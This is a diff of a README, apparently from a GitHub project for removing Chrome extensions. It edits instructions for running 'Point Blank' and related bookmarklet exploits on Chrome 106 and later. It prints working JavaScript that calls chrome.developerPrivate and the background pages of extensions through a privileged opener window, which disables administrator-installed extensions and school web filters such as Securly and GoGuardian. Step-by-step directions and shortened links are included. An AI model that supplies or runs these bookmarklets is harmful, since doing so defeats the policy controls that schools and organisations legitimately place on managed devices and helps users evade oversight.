@@ -18,39 +18,17 @@ If you need any help, please go here: https://github.com/3kh0/ext-remover/discus
 
 
 
-## 106 and higher exploit
-1. Bookmark this code 
+## Using Point Blank, 106 and higher.
+1. [found by bypassi](https://blog.bypassi.com/_/point-blank/) . Bookmark this code 
 ```js
-javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
+javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 125);
 ```
-2. go to chrome://extensions, click on a extension that YOU installed from the Chrome Web Store, click details scroll down until you see View in chrome web store, AS SOON AS YOU CLICK ON IT SPAM ESC if it loads into chrome webstore try again, but if it is a blank screen press the bookmarklet and put the id of the extension in.
-## 106 And Higher Method
+2. go to chrome://extensions, click on a extension that YOU installed from the Chrome Web Store, click details scroll down until you see View in chrome web store, AS SOON AS YOU CLICK ON IT SPAM ESC if it loads into chrome webstore try again, but if it is a blank screen press the bookmarklet and put the id of the extension in. Also, if you close the tab, it will stop working
+## 106 And Higher Exploit
 
 1.  Make a bookmarklet with this code ``` javascript:localStorage.cluster="UNKNOWN_SCHOOL,"+(confirm("ok = Disable\ncancel = Enable ")?99999999999999:0),opener.chrome.extension.getBackgroundPage().location.reload() ```
 2. Go to tinyurl.com/goofcurly if you have securly, tinyurl.com/goofguardian if you have goguardian, tinurl.com/goofsi for blocksi, tinyurl.com/goofclassroom for securly classroom, and tinyurl.com/goofumbrella. 
 3. Once your on the link depending on your blocker, click the button you see, it should open a about:blank tab, then click the bookmarklet and press ok, and all sites should be unblocked. Credit to the kajigs on the Titanium Network Discord.
-
-## Using point blank
-
-Using the [found by bypassi](https://blog.bypassi.com/_/point-blank/) you can disable extensions.
-
-You will need to run bookmarklets and a extension installed from the chrome web store
-
-Steps:
-
-1. Go to chrome://extensions
-2. Click any extension that's installed from the webstore, not one of the enterprise installed extensions
-3. Scroll down and click "Open in Chrome Web Store"
-4. Spam escape before the page loads. it should be a white screen, if it loads into the chrome webstore you have to try again.
-5. Run this bookmarklet:
-```js
-let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
-```
-6. Insert extension ID into the box
-
-Note, if you close the tab the extensions will come back.
-
-Uses Bypassi's pointblank exploit, Sharp_Jack#4374 made the initial payload, posted to TN kajigs by CoolElectronics#4683
 
 ## For v106 and up
 
